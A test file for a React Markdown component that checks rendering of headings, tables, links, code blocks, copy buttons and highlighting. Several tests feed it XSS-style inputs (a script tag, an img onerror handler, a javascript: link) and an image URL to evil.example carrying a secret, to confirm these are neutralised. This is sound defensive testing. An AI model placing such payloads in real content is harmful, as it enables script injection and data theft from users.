import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { Markdown } from './Markdown'

afterEach(() => vi.restoreAllMocks())

describe('Markdown', () => {
  it('renders headings, emphasis, lists and tables (GitHub flavour)', () => {
    render(
      <Markdown
        text={
          '## Title\n\nSome **bold** and *slanted* text.\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |'
        }
      />,
    )

    expect(screen.getByRole('heading', { level: 3, name: 'Title' })).toBeInTheDocument()
    expect(screen.getByText('bold').tagName).toBe('STRONG')
    expect(screen.getAllByRole('listitem')).toHaveLength(2)
    expect(screen.getByRole('table')).toBeInTheDocument()
    expect(screen.getByRole('cell', { name: '2' })).toBeInTheDocument()
  })

  it('shows raw HTML as text instead of running it', () => {
    const { container } = render(
      <Markdown
        text={
          'Hello <script>window.pwned = 1</script> <img src=x onerror="window.pwned=2"> <b>x</b>'
        }
      />,
    )

    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('b')).toBeNull()
    expect(container).toHaveTextContent('<script>')
    expect((window as unknown as { pwned?: number }).pwned).toBeUndefined()
  })

  it('opens links in a new tab with rel=noopener noreferrer', () => {
    render(<Markdown text="See [the docs](https://example.com/docs)." />)

    const link = screen.getByRole('link', { name: 'the docs' })
    expect(link).toHaveAttribute('href', 'https://example.com/docs')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })

  it('does not make a javascript: link clickable', () => {
    const { container } = render(<Markdown text="[click me](javascript:alert(1))" />)

    for (const a of Array.from(container.querySelectorAll('a'))) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
    }
    expect(container).toHaveTextContent('click me')
  })

  it('does not fetch images: the alt text is shown instead', () => {
    const { container } = render(
      <Markdown text="![a chart of sales](https://evil.example/p.png?q=secret)" />,
    )

    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('a chart of sales')
  })

  it('renders inline code without a code block', () => {
    render(<Markdown text="Use `npm ci` here." />)

    expect(screen.getByText('npm ci').tagName).toBe('CODE')
    expect(screen.queryByRole('button', { name: /copy/i })).toBeNull()
  })

  it('renders a fenced block as code with its language and a copy button', async () => {
    render(<Markdown text={'```python\nprint("hi")\n```'} />)

    expect(screen.getByText('python')).toBeInTheDocument()
    expect(screen.getByRole('button', { name: 'Copy code' })).toBeInTheDocument()
    expect(screen.getByText('print("hi")', { exact: false })).toBeInTheDocument()
  })

  it('copies the exact code, without the trailing newline, and says so', async () => {
    const user = userEvent.setup()
    const writeText = vi.spyOn(navigator.clipboard, 'writeText').mockResolvedValue()
    render(<Markdown text={'```sh\nnpm ci\nnpm test\n```'} />)

    await user.click(screen.getByRole('button', { name: 'Copy code' }))

    expect(writeText).toHaveBeenCalledWith('npm ci\nnpm test')
    expect(await screen.findByRole('button', { name: 'Copied' })).toBeInTheDocument()
  })

  it('highlights known languages with classes, never with inline styles', async () => {
    const { container } = render(
      <Markdown text={'```python\ndef f():\n    return 1  # one\n```'} />,
    )

    await waitFor(() => expect(screen.getByText('def')).toHaveClass('text-accent'))
    expect(screen.getByText('# one')).toHaveClass('text-neutral-400')
    expect(container.querySelector('[style]')).toBeNull()
  })

  it('shows code without a grammar as plain text', async () => {
    render(<Markdown text={'```nosuchlang\nsome code\n```'} />)

    expect(screen.getByText('some code')).toBeInTheDocument()
    expect(screen.getByText('nosuchlang')).toBeInTheDocument()
  })

  it('does not highlight while the answer is still streaming', async () => {
    render(<Markdown text={'```python\ndef f(): pass\n```'} streaming />)

    await new Promise((r) => setTimeout(r, 50))
    expect(screen.getByText('def f(): pass')).toBeInTheDocument() // one unsplit text node
  })
})
